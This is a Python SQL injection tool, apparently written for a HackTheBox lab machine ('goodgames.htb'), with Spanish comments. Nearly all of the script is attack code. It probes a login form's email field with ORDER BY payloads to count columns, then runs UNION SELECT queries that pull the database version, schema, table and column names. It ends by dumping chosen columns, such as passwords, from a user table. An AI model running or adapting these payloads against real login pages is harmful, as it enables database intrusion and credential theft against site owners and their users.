import requests
import sys
import argparse

def make_request(url: str) -> int:
    for x in range(100, 0, -1):
        ress = requests.post(url=url, data={"email": f"' order by {x}-- -", "password": "test"})
        if len(ress.text) != 33490:
            print("The number of columns inside the table:", x)
            return x
    return 0

def make_sqli(num_columns: int):
    url = "http://goodgames.htb/login"
    column_placeholders = ','.join(str(i) for i in range(1, num_columns))
    
    # Obtener la versión de la base de datos
    (f"' union select {column_placeholders},@@version-- -")
    data = {"email": f"' union select {column_placeholders},@@version-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), "Welcome"))
    
    # Obtener los nombres de las bases de datos
    (f"' union select {column_placeholders},schema_name from information_schema.schemata-- -")
    data = {"email": f"' union select {column_placeholders},schema_name from information_schema.schemata-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), "Welcome"))
    
    # Obtener los nombres de las tablas en una base de datos específica
    table_schema = input("Introduce el nombre del esquema de tabla ('main' por ejemplo): ")
    (f"' union select {column_placeholders},table_name from information_schema.tables where table_schema='{table_schema}'-- -")
    data = {"email": f"' union select {column_placeholders},table_name from information_schema.tables where table_schema='{table_schema}'-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), "Welcome"))
    
    # Obtener los nombres de las columnas de una tabla específica ('user' en este caso)
    table_name = input("Introduce el nombre de la tabla ('user' por ejemplo): ")
    (f"' union select {column_placeholders},column_name from information_schema.columns where table_name='{table_name}'-- -")
    data = {"email": f"' union select {column_placeholders},column_name from information_schema.columns where table_name='{table_name}'-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), "Welcome"))


    columns = input("Ingresa las columnas de 'user' separadas por comas (por ejemplo: id, name, password, email): ")
    columns_list = [col.strip() for col in columns.split(',')]
    
    sql_query = f"' union select {column_placeholders},group_concat({','.join(columns_list)}) from {table_name}-- -"
    data = {"email": sql_query, "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), "Welcome"))
    

def find_and_print(text: str, marker: str) -> str:
    start = text.find(marker)
    if start != -1:
        start += len(marker) + 1
        end = text.find('<', start)
        if end != -1:
            return text[start:end]
    return "No data found"

def main():
    parser = argparse.ArgumentParser(description="SQL Injection tool")
    parser.add_argument("url", help="URL of the login page")
    args = parser.parse_args()

    try:
        url = args.url
        num_columns = make_request(url)
        
        if num_columns:
            make_sqli(num_columns)
        else:
            print("Failed to determine the number of columns.")
    except Exception as e:
        print(str(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
